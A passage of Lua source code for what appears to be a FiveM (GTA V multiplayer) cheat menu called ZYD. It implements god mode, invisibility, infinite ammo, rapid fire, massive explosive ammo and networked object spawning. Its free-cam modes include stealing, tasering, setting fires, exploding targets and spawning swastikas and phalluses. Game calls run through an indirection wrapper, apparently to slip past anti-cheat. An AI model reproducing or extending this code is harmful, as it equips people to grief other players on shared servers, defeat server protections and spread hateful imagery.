                if not ZYD.Showing and ZYD.Config.UseAutoWalk and not (ZYD.Config.UseAutoWalkAlt and (ZYD.FreeCam.On or ZYD.RCCar.CamOn)) then
                    safe = true
                elseif not ZYD.Config.UseAutoWalk and not (ZYD.Config.UseAutoWalkAlt and (ZYD.FreeCam.On or ZYD.RCCar.CamOn)) then
                    safe = true
                elseif not ZYD.Config.UseAutoWalkAlt and (ZYD.FreeCam.On or ZYD.RCCar.CamOn) then
                    safe = true
                end

                if not ZYD.Config.Player.AntiAFK and _was_anti_afk then
                    safe = true
                end

                if ZYD.Config.Player.AntiAFK then
                    safe = false
                end

                if safe then
                    ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
                    walking = false
                end
            end

            if not walking and not magic_riding then
                local safe

                if ZYD.Showing and ZYD.Config.UseAutoWalk and not (ZYD.RCCar.CamOn or ZYD.FreeCam.On) then
                    safe = true
                elseif ZYD.Config.UseAutoWalkAlt and (ZYD.RCCar.CamOn or ZYD.FreeCam.On) then
                    safe = true
                end

                if was_fakedead or fakedead_timer >= ZYD:GetFunction("GetGameTimer")() then
                    safe = false
                    ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
                end

                if ZYD.Config.Player.AntiAFK then
                    safe = true
                end

                if safe then
                    walking = true
                    local veh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                    if ZYD:GetFunction("DoesEntityExist")(veh) then
                        ZYD:GetFunction("TaskVehicleDriveWander")(ZYD:GetFunction("PlayerPedId")(), veh, 40.0, 0)
                    else
                        ZYD:GetFunction("TaskWanderStandard")(ZYD:GetFunction("PlayerPedId")(), 10.0, 10)
                    end
                end
            end

            if ZYD.Showing then
                ZYD:GetFunction("DisableAllControlActions")(0)
                ZYD:GetFunction("SetMouseCursorActiveThisFrame")()
                ZYD:GetFunction("SetMouseCursorSprite")(1)
                ZYD:DrawMenu()

                if not was_showing then
                    selected_config = "none"
                end

                was_showing = true
            elseif was_showing then
                if walking and not ZYD:GetFunction("IsEntityInAir")(ZYD:GetFunction("PlayerPedId")()) then
                    ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
                    walking = false
                end

                was_showing = false
            end

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys[ZYD.Config.ShowKey]) and not keyboard_open then
                ZYD.Showing = not ZYD.Showing
            end

            if ZYD.Config.FreeCamKey ~= "NONE" and ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys[ZYD.Config.FreeCamKey]) and not keyboard_open then
                ZYD.FreeCam.On = not ZYD.FreeCam.On
            end

            if ZYD.Config.Player.ForceRadar then
                ZYD:GetFunction("DisplayRadar")(true)
            end

            if ZYD.Config.Player.FakeDead then
                ZYD:GetFunction("SetPedToRagdoll")(ZYD:GetFunction("PlayerPedId")(), 1000, 1000, 0, true, true, false)
                was_fakedead = true
            elseif was_fakedead then
                walking = false
                ZYD:GetFunction("SetPedToRagdoll")(ZYD:GetFunction("PlayerPedId")(), 1, 1, 0, true, true, false)
                ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
                was_fakedead = false
                fakedead_timer = ZYD:GetFunction("GetGameTimer")() + 1500
            end

            if ZYD.Config.Player.SuperJump then
                ZYD:GetFunction("SetSuperJumpThisFrame")(PlayerId())
            end

            if ZYD.Config.Player.Invisibility then
                ZYD:GetFunction("SetEntityVisible")(ZYD:GetFunction("PlayerPedId")(), false, false)
                ZYD:GetFunction("SetEntityLocallyVisible")(ZYD:GetFunction("PlayerPedId")(), true)
                ZYD:GetFunction("SetEntityAlpha")(ZYD:GetFunction("PlayerPedId")(), 150)
                was_invis = true
            elseif was_invis then
                ZYD:GetFunction("SetEntityVisible")(ZYD:GetFunction("PlayerPedId")(), true, true)
                ZYD:GetFunction("SetEntityAlpha")(ZYD:GetFunction("PlayerPedId")(), 255)
                was_invis = false
            end

            ZYD:GetFunction("SetEntityProofs")(ZYD:GetFunction("PlayerPedId")(), ZYD.Config.Player.God, ZYD.Config.Player.God, ZYD.Config.Player.God, ZYD.Config.Player.God, ZYD.Config.Player.God, ZYD.Config.Player.God, ZYD.Config.Player.God, ZYD.Config.Player.God)

            if ZYD.Config.Player.SemiGod then
                ZYD:GetFunction("SetEntityHealth")(ZYD:GetFunction("PlayerPedId")(), 200)
            end

            if ZYD.Config.Player.InfiniteStamina then
                ZYD:GetFunction("ResetPlayerStamina")(ZYD:GetFunction("PlayerId")())
            end

            if ZYD.Config.Player.NoRagdoll then
                ZYD:GetFunction("SetPedCanRagdoll")(ZYD:GetFunction("PlayerPedId")(), false)
                was_noragdoll = true
            elseif was_noragdoll then
                ZYD:GetFunction("SetPedCanRagdoll")(ZYD:GetFunction("PlayerPedId")(), true)
                was_noragdoll = false
            end

            if ZYD.Config.Player.FastRun then
                ZYD:GetFunction("SetRunSprintMultiplierForPlayer")(ZYD:GetFunction("PlayerId")(), 1.49)
                ZYD:GetFunction("SetPedMoveRateOverride")(ZYD:GetFunction("PlayerPedId")(), 2.0)
                was_fastrun = true
            elseif was_fastrun then
                ZYD:GetFunction("SetRunSprintMultiplierForPlayer")(ZYD:GetFunction("PlayerId")(), 1.0)
                ZYD:GetFunction("SetPedMoveRateOverride")(ZYD:GetFunction("PlayerPedId")(), 0.0)
                was_fastrun = false
            end

            if ZYD.Config.Player.NoReload then
                local curWep = ZYD:GetFunction("GetSelectedPedWeapon")(ZYD:GetFunction("PlayerPedId")())

                if curWep ~= ZYD:GetFunction("GetHashKey")("WEAPON_MINIGUN") then
                    ZYD:GetFunction("PedSkipNextReloading")(ZYD:GetFunction("PlayerPedId")())
                end
            end

            if ZYD.Config.Player.InfiniteAmmo then
                local curWep = ZYD:GetFunction("GetSelectedPedWeapon")(ZYD:GetFunction("PlayerPedId")())
                local ret, cur_ammo = ZYD:GetFunction("GetAmmoInClip")(ZYD:GetFunction("PlayerPedId")(), curWep)

                if ret then
                    local max_ammo = ZYD:GetFunction("GetMaxAmmoInClip")(ZYD:GetFunction("PlayerPedId")(), curWep, 1)

                    if cur_ammo < max_ammo and max_ammo > 0 then
                        ZYD:GetFunction("SetAmmoInClip")(ZYD:GetFunction("PlayerPedId")(), curWep, max_ammo)
                    end
                end

                local ret, max = ZYD:GetFunction("GetMaxAmmo")(ZYD:GetFunction("PlayerPedId")(), curWep)

                if ret then
                    ZYD:GetFunction("SetPedAmmo")(ZYD:GetFunction("PlayerPedId")(), curWep, max)
                end
            end

            if ZYD.Config.Player.InfiniteAmmo then
                local curWep = ZYD:GetFunction("GetSelectedPedWeapon")(ZYD:GetFunction("PlayerPedId")())
                local ret, cur_ammo = ZYD:GetFunction("GetAmmoInClip")(ZYD:GetFunction("PlayerPedId")(), curWep)

                if ret then
                    local max_ammo = ZYD:GetFunction("GetMaxAmmoInClip")(ZYD:GetFunction("PlayerPedId")(), curWep, 1)

                    if cur_ammo < max_ammo and max_ammo > 0 then
                        ZYD:GetFunction("SetAmmoInClip")(ZYD:GetFunction("PlayerPedId")(), curWep, max_ammo)
                    end
                end
            end

            if ZYD.Config.Player.RapidFire and IsDisabledControlPressed(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing and (not ZYD.FreeCam.On and not ZYD.RCCar.CamOn) then
                local curWep = ZYD:GetFunction("GetSelectedPedWeapon")(ZYD:GetFunction("PlayerPedId")())
                local cur = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetCurrentPedWeaponEntityIndex")(ZYD:GetFunction("PlayerPedId")()), 0.0, 0.0, 0.0)
                local _dir = ZYD:GetFunction("GetGameplayCamRot")(0)
                local dir = rot_to_dir(_dir)
                local dist = ZYD.Config.Player.NoDrop and 99999.0 or 200.0
                local len = _multiply(dir, dist)
                local targ = cur + len
                ZYD:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, ZYD:GetFunction("PlayerPedId")(), true, true, 24000.0)

                if ZYD.Config.Player.ExplosiveAmmo then
                    local impact, coords = ZYD:GetFunction("GetPedLastWeaponImpactCoord")(ZYD:GetFunction("PlayerPedId")())

                    if impact then
                        ZYD:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
                    end
                end
            end

            if not ZYD.Config.Player.RapidFire and ZYD.Config.Player.ExplosiveAmmo then
                local impact, coords = ZYD:GetFunction("GetPedLastWeaponImpactCoord")(ZYD:GetFunction("PlayerPedId")())

                if impact then
                    ZYD:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
                end

                ZYD:GetFunction("SetExplosiveMeleeThisFrame")(ZYD:GetFunction("PlayerId")())
            end

            if ZYD.Config.Player.InfiniteCombatRoll then
                for i = 0, 3 do
                    ZYD:GetFunction("StatSetInt")(ZYD:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 9999, true)
                    ZYD:GetFunction("StatSetInt")(ZYD:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 9999, true)
                end

                was_infinite_combat_roll = true
            elseif was_infinite_combat_roll then
                for i = 0, 3 do
                    ZYD:GetFunction("StatSetInt")(ZYD:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 0, true)
                    ZYD:GetFunction("StatSetInt")(ZYD:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 0, true)
                end
            end

            if ZYD.Config.Player.MagMode then
                ZYD:DoMagneto()
            end

            ZYD:DoKeyPressed()
        end
    end)

    local _keys = {}

    function ZYD:DoKeyPressed()
        if not ZYD.Config.ShowControlsOnScreen then return end
        local offY = 0
        local count = 0

        for name, control in dict.pairs(ZYD.Keys) do
            if ZYD:GetFunction("IsControlJustPressed")(0, control) or ZYD:GetFunction("IsDisabledControlJustPressed")(0, control) then
                table.insert(_keys, {
                    str = name .. "[" .. control .. "]",
                    expires = ZYD:GetFunction("GetGameTimer")() + 5000
                })
            end

            count = count + 1
        end

        for _, key in dict.pairs(_keys) do
            local cur = ZYD:GetFunction("GetGameTimer")()
            local left = key.expires - cur

            if left <= 0 then
                table.remove(_keys, _)
            else
                local secs = (left / 1000)
                local alpha = dict.math.ceil(((left / 1000) / 5) * 255) + 50
                alpha = _clamp(alpha, 0, 255)
                offY = offY + 0.024 * _clamp(secs * 4, 0, 1)
                ZYD:ScreenText(key.str, 4, 0.0, 0.8, 1 - offY, 0.3, 255, 255, 255, alpha)
            end
        end
    end

    local function _do_riding()
        if not magic_riding then
            ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
            local rot = ZYD:GetFunction("GetEntityRotation")(magic_carpet_obj)
            ZYD:GetFunction("SetEntityRotation")(magic_carpet_obj, 0.0, rot.y, rot.z)
        else
            local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
            local carpet = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
            local head = ZYD:GetFunction("GetEntityHeading")(magic_carpet_obj)
            ZYD:GetFunction("SetEntityHeading")(ZYD:GetFunction("PlayerPedId")(), head)
            ZYD:GetFunction("SetEntityCoords")(ZYD:GetFunction("PlayerPedId")(), carpet.x, carpet.y, carpet.z)
            ZYD:GetFunction("TaskPlayAnim")(ZYD:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
        end
    end

    local function _right_vec()
        local right = vector3(0, 1, 0)

        return right
    end

    local function _up_vec()
        local up = vector3(0, 0, 1)

        return up
    end

    local function _do_flying()
        if not magic_riding then return end
        ZYD.FreeCam:DisableMovement(true)

        if not IsEntityPlayingAnim(ZYD:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 3) then
            ZYD:GetFunction("TaskPlayAnim")(ZYD:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
        end

        local carpet = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
        local rot = ZYD:GetFunction("GetGameplayCamRot")(0)

        if not ZYD.FreeCam.On then
            ZYD:GetFunction("SetEntityRotation")(magic_carpet_obj, rot.x + 0.0, rot.y + 0.0, rot.z + 0.0)
            local forwardVec = ZYD:GetFunction("GetEntityForwardVector")(magic_carpet_obj)
            local rightVec = _right_vec(magic_carpet_obj)
            local upVec = _up_vec(magic_carpet_obj)
            local speed = 1.0

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTCTRL"]) then
                speed = 0.1
            elseif ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                speed = 1.8
            end

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["W"]) then
                carpet = carpet + forwardVec * speed
            end

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["S"]) then
                carpet = carpet - forwardVec * speed
            end

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["SPACE"]) then
                carpet = carpet + upVec * speed
            end

            if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["X"]) then
                carpet = carpet - upVec * speed
            end

            ZYD:GetFunction("SetEntityCoords")(magic_carpet_obj, carpet.x, carpet.y, carpet.z)
        end

        ZYD:GetFunction("SetEntityRotation")(ZYD:GetFunction("PlayerPedId")(), rot.x, rot.y, rot.z)
        ZYD:GetFunction("AttachEntityToEntity")(ZYD:GetFunction("PlayerPedId")(), magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot.x, ZYD:GetFunction("GetEntityHeading")(magic_carpet_obj), rot.z, false, false, false, false, 1, false)
    end

    local _no_combat
    local _was_no_combat

    CreateThread(function()
        while ZYD.Enabled do
            Wait(0)

            if _no_combat and not _was_no_combat then
                _was_no_combat = true
            elseif not _no_combat and _was_no_combat then
                _was_no_combat = false
                ZYD.FreeCam:DisableCombat(_no_combat)
            end

            if _no_combat then
                ZYD.FreeCam:DisableCombat(_no_combat)
            end
        end
    end)

    CreateThread(function()
        ZYD:RequestModelSync("apa_mp_h_acc_rugwoolm_03")
        ZYD:GetFunction("RequestAnimDict")("rcmcollect_paperleadinout@")

        while ZYD.Enabled do
            Wait(0)

            if ZYD.Config.Player.MagicCarpet then
                local our_cam = ZYD:GetFunction("GetRenderingCam")()

                if not magic_carpet_obj or not ZYD:GetFunction("DoesEntityExist")(magic_carpet_obj) then
                    local cur = ZYD:GetFunction("GetGameplayCamCoord")()
                    local _dir = ZYD:GetFunction("GetGameplayCamRot")(0)
                    local dir = rot_to_dir(_dir)
                    local dist = 100.0
                    local len = _multiply(dir, dist)
                    local targ = cur + len
                    local handle = ZYD:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 1, preview_magic_carpet)
                    local _, hit, hit_pos, _, entity = ZYD:GetFunction("GetShapeTestResult")(handle)

                    if not preview_magic_carpet or not ZYD:GetFunction("DoesEntityExist")(preview_magic_carpet) then
                        _no_combat = true
                        preview_magic_carpet = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, true, true)
                        ZYD:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
                        ZYD:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
                        Wait(50)
                    elseif hit then
                        ZYD:GetFunction("SetEntityCoords")(preview_magic_carpet, hit_pos.x, hit_pos.y, hit_pos.z + 0.5)
                        ZYD:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
                        ZYD:GetFunction("FreezeEntityPosition")(preview_magic_carpet, true)
                        ZYD:GetFunction("SetEntityRotation")(preview_magic_carpet, 0.0, 0.0, _dir.z + 0.0)
                        ZYD:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
                    end

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing then
                        magic_carpet_obj = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, true, true, true)
                        ZYD:DoNetwork(magic_carpet_obj)
                        local rot = ZYD:GetFunction("GetEntityRotation")(preview_magic_carpet)
                        ZYD:GetFunction("SetEntityRotation")(magic_carpet_obj, rot)
                        ZYD.Util:DeleteEntity(preview_magic_carpet)
                        _no_combat = false
                    end
                else
                    ZYD:GetFunction("FreezeEntityPosition")(magic_carpet_obj, true)
                    _do_flying()
                    local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
                    local carpet = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, vector_origin)
                    local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(coords.x, coords.y, coords.z, carpet.x, carpet.y, carpet.z)

                    if dist <= 5.0 then
                        ZYD:Draw3DText(carpet.x, carpet.y, carpet.z, "Press [E] to get " .. (magic_riding and "off" or "on") .. ".", ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3])

                        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["E"]) then
                            magic_riding = not magic_riding
                            _do_riding()
                        end
                    end
                end
            else
                _no_combat = false

                if preview_magic_carpet and ZYD:GetFunction("DoesEntityExist")(preview_magic_carpet) then
                    ZYD.Util:DeleteEntity(preview_magic_carpet)
                end

                if magic_carpet_obj and ZYD:GetFunction("DoesEntityExist")(magic_carpet_obj) then
                    ZYD.Util:DeleteEntity(magic_carpet_obj)
                    ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
                end
            end
        end
    end)

    CreateThread(function()
        while ZYD.Enabled do
            if ZYD.Config.Player.SuperMan then
                ZYD:GetFunction("GivePlayerRagdollControl")(PlayerId(), true)
                ZYD:GetFunction("SetPedCanRagdoll")(ZYD:GetFunction("PlayerPedId")(), false)
                ZYD:GetFunction("GiveDelayedWeaponToPed")(ZYD:GetFunction("PlayerPedId")(), 0xFBAB5776, 1, 0)
                local up, forward = ZYD:GetFunction("IsControlPressed")(0, ZYD.Keys["SPACE"]), ZYD:GetFunction("IsControlPressed")(0, ZYD.Keys["W"])

                if up or forward then
                    if up then
                        ZYD:GetFunction("ApplyForceToEntity")(ZYD:GetFunction("PlayerPedId")(), 1, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                    elseif ZYD:GetFunction("IsEntityInAir")(ZYD:GetFunction("PlayerPedId")()) then
                        ZYD:GetFunction("ApplyForceToEntity")(ZYD:GetFunction("PlayerPedId")(), 1, 0.0, 9999999.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                    end

                    Wait(0)
                end
            else
                ZYD:GetFunction("GivePlayerRagdollControl")(PlayerId(), false)
                ZYD:GetFunction("SetPedCanRagdoll")(ZYD:GetFunction("PlayerPedId")(), true)
            end

            Wait(0)
        end
    end)

    local p, y, r

    local function approach(from, to, inc)
        if from >= to then return from end

        return from + inc
    end

    local insults, voices = {"GENERIC_INSULT_HIGH", "GENERIC_INSULT_MED", "GENERIC_SHOCKED_HIGH", "FIGHT_RUN", "CRASH_CAR", "KIFFLOM_GREET", "PHONE_SURPRISE_EXPLOSION"}, {"S_M_Y_SHERIFF_01_WHITE_FULL_01", "A_F_M_SOUCENT_02_BLACK_FULL_01", "A_F_M_BODYBUILD_01_WHITE_FULL_01", "A_F_M_BEVHILLS_02_BLACK_FULL_01"}

    ZYD.FreeCam = {
        Cam = nil,
        On = false,
        Modifying = nil,
        Mode = 1,
        Modes = {
            ["LOOK_AROUND"] = 1,
            ["REMOVER"] = 2,
            ["PED_SPAWNER"] = 3,
            ["OBJ_SPAWNER"] = 4,
            ["VEH_SPAWNER"] = 5,
            ["PREMADE_SPAWNER"] = 6,
            ["TELEPORT"] = 7,
            ["RC_CAR"] = 8,
            ["STEAL"] = 9,
            ["TAZE"] = 10,
            ["HYDRANT"] = 11,
            ["FIRE"] = 12,
            ["SPIKE_STRIPS"] = 13,
            ["DISABLE_VEHICLE"] = 14,
            ["EXPLODE"] = 15
        },
        ModeNames = {
            [1] = "Przesuwanie obiektow",
            [2] = "Usuwanie pojazdow/obiektow",
            [3] = "Spawnowanie pedow",
            [4] = "Spawnowanie obiektow",
            [5] = "Spawnowanie pojazdow",
            [6] = "Spawnowanie swastyk/dickow",
            [7] = "Teleportowanie"
        }
    }

    function ZYD.FreeCam:Switcher()
        if not self.On then return end
        local cur = self.Mode
        local new = cur
        if self.DraggingEntity and ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity) then return end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["["]) then
            new = cur - 1

            if not self.ModeNames[new] then
                new = #self.ModeNames
            end

            self.Mode = new
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["]"]) then
            new = cur + 1

            if not self.ModeNames[new] then
                new = 1
            end

            self.Mode = new
        end
    end

    function ZYD.FreeCam:Toggle(mode)
        self.On = not self.On
        self.Mode = mode
    end

    function ZYD.FreeCam:GetModelSize(hash)
        return ZYD:GetFunction("GetModelDimensions")(hash)
    end

    function ZYD.FreeCam:DrawBoundingBox(entity, r, g, b, a)
        if entity then
            r = r or 255
            g = g or 0
            b = b or 0
            a = a or 40
            local model = ZYD:GetFunction("GetEntityModel")(entity)
            local min, max = ZYD:GetFunction("GetModelDimensions")(model)
            local top_front_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, max)
            local top_back_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, max.z))
            local bottom_front_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, max.y, min.z))
            local bottom_back_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, min.z))
            local top_front_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, max.z))
            local top_back_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, min.y, max.z))
            local bottom_front_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, min.z))
            local bottom_back_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, min)
            -- LINES
            -- RIGHT SIDE
            ZYD:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
            ZYD:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
            ZYD:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
            ZYD:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
            -- LEFT SIDE
            ZYD:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
            ZYD:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
            ZYD:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
            ZYD:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
            -- Connection
            ZYD:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
            ZYD:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
            ZYD:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
            ZYD:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
            -- POLYGONS
            -- FRONT
            ZYD:GetFunction("DrawPoly")(top_front_left, top_front_right, bottom_front_right, r, g, b, a)
            ZYD:GetFunction("DrawPoly")(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)
            -- TOP
            ZYD:GetFunction("DrawPoly")(top_front_right, top_front_left, top_back_right, r, g, b, a)
            ZYD:GetFunction("DrawPoly")(top_front_left, top_back_left, top_back_right, r, g, b, a)
            -- BACK
            ZYD:GetFunction("DrawPoly")(top_back_right, top_back_left, bottom_back_right, r, g, b, a)
            ZYD:GetFunction("DrawPoly")(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)
            -- LEFT
            ZYD:GetFunction("DrawPoly")(top_back_left, top_front_left, bottom_front_left, r, g, b, a)
            ZYD:GetFunction("DrawPoly")(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)
            -- RIGHT
            ZYD:GetFunction("DrawPoly")(top_front_right, top_back_right, bottom_front_right, r, g, b, a)
            ZYD:GetFunction("DrawPoly")(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)
            -- BOTTOM
            ZYD:GetFunction("DrawPoly")(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)
            ZYD:GetFunction("DrawPoly")(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)

            return true
        end

        return false
    end

    function ZYD.FreeCam:Crosshair(on)
        if on then
            ZYD:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 255)
            ZYD:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 255)
        else
            ZYD:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, 100, 100, 100, 255)
            ZYD:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, 100, 100, 100, 255)
        end
    end

    function ZYD:Draw3DText(x, y, z, text, r, g, b)
        ZYD:GetFunction("SetDrawOrigin")(x, y, z, 0)
        ZYD:GetFunction("SetTextFont")(0)
        ZYD:GetFunction("SetTextProportional")(0)
        ZYD:GetFunction("SetTextScale")(0.0, 0.20)
        ZYD:GetFunction("SetTextColour")(r, g, b, 255)
        ZYD:GetFunction("SetTextOutline")()
        ZYD:GetFunction("BeginTextCommandDisplayText")("STRING")
        ZYD:GetFunction("SetTextCentre")(1)
        ZYD:GetFunction("AddTextComponentSubstringPlayerName")(text)
        ZYD:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
        ZYD:GetFunction("ClearDrawOrigin")()
    end

    function ZYD:DrawScaled3DText(x, y, z, textInput, fontId, scaleX, scaleY)
        local coord = ZYD:GetFunction("GetFinalRenderedCamCoord")()
        local px, py, pz = coord.x, coord.y, coord.z
        local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(px, py, pz, x, y, z)
        local scale = (1 / dist) * 20
        local fov = (1 / ZYD:GetFunction("GetGameplayCamFov")()) * 100
        local scale = scale * fov
        ZYD:GetFunction("SetTextScale")(scaleX * scale, scaleY * scale)
        ZYD:GetFunction("SetTextFont")(fontId)
        ZYD:GetFunction("SetTextProportional")(1)
        ZYD:GetFunction("SetTextColour")(250, 250, 250, 255) -- You can change the text color here
        ZYD:GetFunction("SetTextDropShadow")(1, 1, 1, 1, 255)
        ZYD:GetFunction("SetTextEdge")(2, 0, 0, 0, 150)
        ZYD:GetFunction("SetTextDropShadow")()
        ZYD:GetFunction("SetTextOutline")()
        ZYD:GetFunction("BeginTextCommandDisplayText")("STRING")
        ZYD:GetFunction("SetTextCentre")(1)
        ZYD:GetFunction("AddTextComponentSubstringPlayerName")(textInput)
        ZYD:GetFunction("SetDrawOrigin")(x, y, z + 2, 0)
        ZYD:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
        ZYD:GetFunction("ClearDrawOrigin")()
    end

    function ZYD.FreeCam:DrawInfoCard(entity)
        if not ZYD:GetFunction("DoesEntityExist")(entity) then return end
        local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.0, 0.0, 0.0)
        local angle = ZYD:GetFunction("GetEntityRotation")(entity)

        if frozen_ents[entity] == nil then
            frozen_ents[entity] = false
        end

        local str = {[[ Model: ]] .. ZYD:GetFunction("GetEntityModel")(entity), [[ Pos: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z), [[ Rot: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(angle.x, angle.y, angle.z), [[ Frozen: ]] .. dict.tostring(frozen_ents[entity])}
        local y = coords.z

        for _, val in dict.pairs(str) do
            ZYD:DrawScaled3DText(coords.x, coords.y, y, val, 4, 0.1, 0.1)
            y = y - 0.35
        end
    end

    function ZYD.FreeCam:CheckType(entity, type)
        if type == "ALL" then return ZYD:GetFunction("IsEntityAnObject")(entity) or ZYD:GetFunction("IsEntityAVehicle")(entity) or ZYD:GetFunction("IsEntityAPed")(entity) end
        if type == "VEHICLE" then return ZYD:GetFunction("IsEntityAVehicle")(entity) end
        if type == "PED" then return ZYD:GetFunction("IsEntityAPed")(entity) end

        return true
    end

    function ZYD.FreeCam:GetType(entity)
        if ZYD:GetFunction("IsEntityAnObject")(entity) then return "OBJECT" end
        if ZYD:GetFunction("IsEntityAVehicle")(entity) then return "VEHICLE" end
        if ZYD:GetFunction("IsEntityAPed")(entity) then return "PED" end
    end

    function ZYD.FreeCam:Clone(entity)
        local type = self:GetType(entity)
        if not type then return end
        local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.1, 0.1, 0.1)
        local rot = ZYD:GetFunction("GetEntityRotation")(entity)

        if type == "OBJECT" then
            local clone = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, true, true, true)
            ZYD:DoNetwork(clone)
